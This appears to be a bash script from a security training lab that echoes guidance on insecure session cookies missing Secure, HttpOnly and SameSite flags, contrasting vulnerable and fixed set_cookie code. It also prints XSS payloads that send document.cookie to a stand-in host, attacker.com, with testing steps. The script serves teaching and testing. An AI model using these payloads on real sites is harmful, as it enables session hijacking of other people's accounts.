#!/bin/bash

# Insecure Session Cookie Checker
# This script checks if cookies are missing Secure, HttpOnly, and SameSite attributes

echo "🔍 Insecure Session Cookie Security Checker"
echo "==========================================="
echo ""
echo "This script demonstrates how to identify insecure session cookies"
echo "that lack Secure, HttpOnly, and SameSite attributes."
echo ""

# Show the vulnerable cookie setting
echo "❌ VULNERABLE COOKIE SETTING (from vulnerable_version/sharepy/backend/main.py):"
echo "   response.set_cookie('session', token)  # Missing security flags!"
echo ""

# Show the secure cookie setting
echo "✅ SECURE COOKIE SETTING (from secure_version/sharepy/backend/main.py):"
echo "   response.set_cookie("
echo "       'session',"
echo "       token,"
echo "       secure=True,      # HTTPS only"
echo "       httponly=True,    # No JavaScript access"
echo "       samesite='strict' # CSRF protection"
echo "   )"
echo ""

echo "🚨 CHECKING FOR INSECURE COOKIES:"
echo ""
echo "To check for insecure cookies manually, examine HTTP responses for:"
echo "1. Missing 'Secure' attribute - cookie sent over HTTP"
echo "2. Missing 'HttpOnly' attribute - JavaScript can access cookie"
echo "3. Missing 'SameSite' attribute - vulnerable to CSRF"
echo ""

echo "📋 COMMON INSECURE PATTERNS:"
echo "   Set-Cookie: session=abc123"
echo "   (vs. secure; HttpOnly; SameSite=Strict)"
echo ""

echo "🛡️  XSS PAYLOADS FOR SESSION COOKIE THEFT:"
echo ""
echo "Input fields for XSS session cookie theft:"
echo ""
echo "1. Basic cookie theft payload:"
echo '   <script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'
echo ""
echo "2. AJAX-based cookie theft:"
echo "   <script>"
echo "   var xhr=new XMLHttpRequest();"
echo "   xhr.open('POST','http://attacker.com/steal');"
echo "   xhr.setRequestHeader('Content-Type','application/json');"
echo "   xhr.send(JSON.stringify({cookie:document.cookie}));"
echo "   </script>"
echo ""
echo "3. Simple alert (for testing):"
echo '   <script>alert("Session cookies: " + document.cookie)</script>'
echo ""

echo "🔧 HOW TO TEST:"
echo "   1. Find an input field that reflects user input"
echo "   2. Enter one of the XSS payloads above"
echo "   3. Submit the form/input"
echo "   4. If successful, the session cookie will be accessible to JavaScript"
echo ""

echo "⚠️  WARNING: This is for educational purposes only."
echo "   Only test on applications you own or have explicit permission to test."